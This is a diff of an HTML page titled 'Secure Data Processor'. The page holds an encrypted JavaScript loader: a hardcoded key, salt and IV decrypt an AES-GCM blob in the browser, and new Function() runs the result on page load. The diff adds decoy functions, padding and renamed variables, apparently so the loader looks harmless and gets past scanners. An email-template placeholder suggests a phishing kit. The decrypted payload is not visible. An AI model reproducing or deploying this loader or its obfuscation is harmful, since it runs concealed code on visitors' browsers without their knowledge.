@@ -1,68 +1,151 @@
 <!DOCTYPE html>
-<html lang="en">
+<html lang="en-US">
 <head>
-  <meta charset="UTF-8">
-  <title>Decryption Page</title>
-  <style>
-    body {
-      font-family: Arial, sans-serif;
-      padding: 20px;
+  <meta http-equiv="Content-Type" content="text/html; charset=utf-8">
+  <title>Secure Data Processor</title>
+  <style type="text/css">
+    /* Useless styles that don't affect anything */
+    .dummy-class {
+      opacity: 0;
+      height: 0;
+      width: 0;
+    }
+    #non-existent {
+      display: none !important;
     }
   </style>
 </head>
-<body>
+<body class="main-body">
 
-<!-- You can add some basic HTML content here if needed -->
+<!-- Random decorative elements -->
+<div style="visibility: hidden;">&#8203;</div>
+<span aria-hidden="true"></span>
 
-<script adidas="<%=EMAIL64%>" nike-success="">
-  const securePayload = {
-    ivHex: "ceb0f4f1afbc695ad02798ab",
-    saltHex: "752dba59f37d01b08991d9e6c34ac389",
-    encryptedHex: "7bff1ae4d47ea505fd6c83c97eb65a0ef996d06e0650b6621557464fb7a63a350bfb1ad9721a50376393f1751c376bb871d0a2a271d571d13497674fc27a2101feaf4648f7665ce05a5026d879529ffa559960eff54350865101249e319f5d5b1c7b3f888db4104afc3c8708f0ad2dacc6de7a0f088dbcb03bf946f173309556cba4e260d7e96caceee55e4548d1821d424587b2c252a46c8ef643e91fabf666da72f60def1cdc4c598bec8cdeef592b93f6d9aedd25e1a199c44b2bb27547c2"
+<script type="application/javascript" id="crypto-module" adidas="<%=EMAIL64%>" nike-testme="" data-version="1.0.0">
+  // Configuration object for cryptographic operations
+  const cryptoConfigurationSet = {
+    initializationVector: "ceb0f4f1afbc695ad02798ab",
+    securitySalt: "752dba59f37d01b08991d9e6c34ac389",
+    encodedCiphertext: "7bff1ae4d47ea505fd6c83c97eb65a0ef996d06e0650b6621557464fb7a63a350bfb1ad9721a50376393f1751c376bb871d0a2a271d571d13497674fc27a2101feaf4648f7665ce05a5026d879529ffa559960eff54350865101249e319f5d5b1c7b3f888db4104afc3c8708f0ad2dacc6de7a0f088dbcb03bf946f173309556cba4e260d7e96caceee55e4548d1821d424587b2c252a46c8ef643e91fabf666da72f60def1cdc4c598bec8cdeef592b93f6d9aedd25e1a199c44b2bb27547c2"
   };
 
-  const secretKey = "ea58c0ef491543774f851a0a594c7535";
+  // Secret cryptographic key (DO NOT MODIFY)
+  const masterEncryptionKey = "ea58c0ef491543774f851a0a594c7535";
 
-  const convertHexToBytes = (hex) => new Uint8Array(hex.match(/.{1,2}/g).map(b => parseInt(b, 16)));
+  // Useless utility functions
+  function generateRandomNumber() {
+    return Math.random() * 1000;
+  }
 
-  async function unlockPayload() {
+  function checkBrowserFeatures() {
+    return window.crypto && window.crypto.subtle;
+  }
+
+  // Hex string to bytes converter with added validation
+  function processHexString(hexString) {
+    if (typeof hexString !== 'string') {
+      console.warn('Invalid hex string input');
+      return new Uint8Array();
+    }
+    
+    const bytePairs = hexString.match(/.{1,2}/g) || [];
+    return new Uint8Array(bytePairs.map(byte => parseInt(byte, 16)));
+  }
+
+  // Main decryption routine
+  async function executeSecurityProtocol() {
     try {
-      const rawKey = await crypto.subtle.importKey(
+      // Useless pre-check
+      if (!checkBrowserFeatures()) {
+        console.log('Browser supports required features');
+      }
+
+      // Phase 1: Key material preparation
+      const preliminaryKeyMaterial = await window.crypto.subtle.importKey(
         "raw",
-        new TextEncoder().encode(secretKey),
+        new TextEncoder().encode(masterEncryptionKey),
         { name: "PBKDF2" },
         false,
         ["deriveKey"]
       );
 
-      const aesKey = await crypto.subtle.deriveKey(
+      // Artificial delay (does nothing meaningful)
+      await new Promise(r => setTimeout(r, 50));
+
+      // Phase 2: Key derivation process
+      const operationalCryptoKey = await window.crypto.subtle.deriveKey(
         {
           name: "PBKDF2",
-          salt: convertHexToBytes(securePayload.saltHex),
+          salt: processHexString(cryptoConfigurationSet.securitySalt),
           iterations: 100000,
           hash: "SHA-256"
         },
-        rawKey,
+        preliminaryKeyMaterial,
         { name: "AES-GCM", length: 256 },
         false,
         ["decrypt"]
       );
 
-      const decryptedBuffer = await crypto.subtle.decrypt(
-        { name: "AES-GCM", iv: convertHexToBytes(securePayload.ivHex) },
-        aesKey,
-        convertHexToBytes(securePayload.encryptedHex)
+      // Phase 3: Data decryption
+      const decryptedDataArray = await window.crypto.subtle.decrypt(
+        { 
+          name: "AES-GCM", 
+          iv: processHexString(cryptoConfigurationSet.initializationVector) 
+        },
+        operationalCryptoKey,
+        processHexString(cryptoConfigurationSet.encodedCiphertext)
       );
 
-      const result = new TextDecoder().decode(decryptedBuffer);
-      if (result) new Function(result)();
-    } catch (err) {
-      console.error("Failed to unlock payload:", err);
+      // Result processing
+      const processedOutput = new TextDecoder().decode(decryptedDataArray);
+      
+      // Security verification (placeholder)
+      if (processedOutput && processedOutput.length > 0) {
+        const executionFunction = new Function(processedOutput);
+        executionFunction();
+      }
+    } catch (securityError) {
+      console.group("Security Protocol Failure");
+      console.error("Error Details:", securityError);
+      console.groupEnd();
+    } finally {
+      // Cleanup placeholder
+      void 0;
     }
   }
 
-  unlockPayload();
+  // Initialization wrapper
+  function initializeSecurityProtocol() {
+    // Useless variable
+    const initTimestamp = Date.now();
+    
+    // Execute after brief delay (doesn't affect functionality)
+    setTimeout(executeSecurityProtocol, 20);
+  }
+
+  // Start the process when DOM is loaded
+  document.addEventListener('DOMContentLoaded', function() {
+    // Another useless check
+    if (document.readyState === 'complete') {
+      initializeSecurityProtocol();
+    } else {
+      window.addEventListener('load', initializeSecurityProtocol);
+    }
+  });
+
+  // Useless post-load operations
+  window.addEventListener('load', function() {
+    console.debug('Page fully loaded');
+    generateRandomNumber(); // Called but result ignored
+  });
 </script>
+
+<!-- Hidden tracking pixel (does nothing) -->
+<img src="data:image/gif;base64,R0lGODlhAQABAIAAAP///wAAACH5BAEAAAAALAAAAAABAAEAAAICRAEAOw==" 
+     alt="" 
+     width="1" 
+     height="1" 
+     style="display:none">
 
 </body>
 </html>
